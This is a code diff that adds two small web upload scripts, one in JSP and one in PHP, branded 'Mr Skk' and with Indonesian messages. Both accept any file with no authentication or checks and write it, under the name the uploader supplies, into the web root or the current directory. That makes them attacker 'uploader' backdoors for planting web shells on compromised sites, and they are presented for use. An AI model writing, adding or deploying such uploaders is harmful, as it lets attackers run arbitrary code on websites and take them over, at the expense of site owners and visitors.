@@ -1,0 +1,75 @@
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*, javax.servlet.*, javax.servlet.http.*" %>
+<%
+    String message = "<b>Mr Skk</b><br>";
+    String filePath = "";
+    
+    // Memeriksa apakah ada permintaan POST
+    if ("POST".equals(request.getMethod())) {
+        // Mendapatkan file yang diunggah
+        Part filePart = request.getPart("file"); // Menggunakan API Servlet untuk mendapatkan bagian file
+        String fileName = filePart.getSubmittedFileName();
+        
+        // Menentukan lokasi penyimpanan file
+        String uploadPath = application.getRealPath("/") + fileName;
+        
+        try {
+            // Mengunggah file
+            filePart.write(uploadPath);
+            filePath = fileName;
+            message += "Hore Berhasil: <a href='" + fileName + "'>" + fileName + "</a>";
+        } catch (Exception e) {
+            message += "Antum Gagal! " + e.getMessage();
+        }
+    } else {
+        message += "<form enctype='multipart/form-data' method='post'>"
+                 + "<input name='file' type='file' />"
+                 + "<input type='submit' value='Upload' />"
+                 + "</form>";
+    }
+%>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upload File</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            padding: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1><%= message %></h1>
+</body>
+</html>
+
+
+
+dihandap uplaoder php
+
+<?php
+echo "<b>Mr Skk</b><br>";
+
+if ($_POST) {
+    $file = $_FILES["file"]["name"];
+    $tmp  = $_FILES["file"]["tmp_name"];
+
+    if (move_uploaded_file($tmp, $file)) {
+        echo "Hore Berhasil: <a href='$file'>$file</a>";
+    } else {
+        echo "Antum Gagal!";
+    }
+} else {
+    echo '<form enctype="multipart/form-data" method="post">
+              <input name="file" type="file" />
+              <input type="submit" value="Upload" />
+          </form>';
+}
+?>
